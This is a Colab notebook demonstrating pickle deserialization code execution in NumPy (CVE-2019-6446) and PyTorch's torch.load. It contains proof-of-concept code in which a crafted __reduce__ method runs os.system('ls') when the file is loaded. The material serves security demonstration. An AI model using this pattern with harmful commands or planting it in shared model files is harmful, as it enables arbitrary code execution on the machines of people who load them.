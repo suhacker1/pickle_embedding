{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "pickle_embedding.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyMWX1YtP8dS0kJwjRUzDtgw",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/suhacker1/pickle_embedding/blob/main/pickle_embedding.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "kCa--c4CTlx5"
      },
      "source": [
        "Improper usage of pickle rendered numpy [vulnerable to arbitrary code execution](https://snyk.io/vuln/SNYK-PYTHON-NUMPY-73513); this was demonstrated through CVE-2019-6446.  \n",
        "\n",
        "The following code has been modified from the original proof of concept. "
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "v-hccWmgMJoN",
        "outputId": "9cf27753-f845-4382-b3b4-837daba10f16"
      },
      "source": [
        "# PoC from https://snyk.io/vuln/SNYK-PYTHON-NUMPY-73513 (CVE-2019-6446)\n",
        "\n",
        "import numpy\n",
        "from numpy import __version__\n",
        "\n",
        "print(__version__)\n",
        "\n",
        "import os\n",
        "import  pickle\n",
        "\n",
        "class Test(object):\n",
        "    def __init__(self):\n",
        "        self.a = 1\n",
        "\n",
        "    def __reduce__(self):\n",
        "        return (os.system,('ls',))\n",
        "\n",
        "tmpdaa = Test()\n",
        "\n",
        "with open(\"a-file.pickle\",'wb') as f:\n",
        "    pickle.dump(tmpdaa,f)\n",
        "\n",
        "# The original PoC used an earlier version where allow_pickle was True by default \n",
        "numpy.load('a-file.pickle', allow_pickle=True)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "1.18.5\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 6
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "iQmVeC77UBP8"
      },
      "source": [
        "A similar vulnerability can be found in PyTorch. Unlike NumPy, PyTorch still relies on Pickle- [only issuing a warning](https://github.com/pytorch/pytorch/pull/32593). "
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "4LdfkXZPMWdK",
        "outputId": "4beeb008-2072-46bc-e35d-63e639523f98"
      },
      "source": [
        "import torch\n",
        "import os\n",
        "import pickle\n",
        "\n",
        "from torch import __version__\n",
        "\n",
        "print(__version__)\n",
        "\n",
        "class Test(object):\n",
        "    def __init__(self):\n",
        "        self.a = 1\n",
        "\n",
        "    def __reduce__(self):\n",
        "        return (os.system,('ls',))\n",
        "\n",
        "tmpdaa = Test()\n",
        "\n",
        "with open(\"a-file.pickle\",'wb') as f:\n",
        "    torch.save(tmpdaa,f)\n",
        "\n",
        "torch.load('a-file.pickle')\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "1.7.0+cu101\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 14
        }
      ]
    }
  ]
}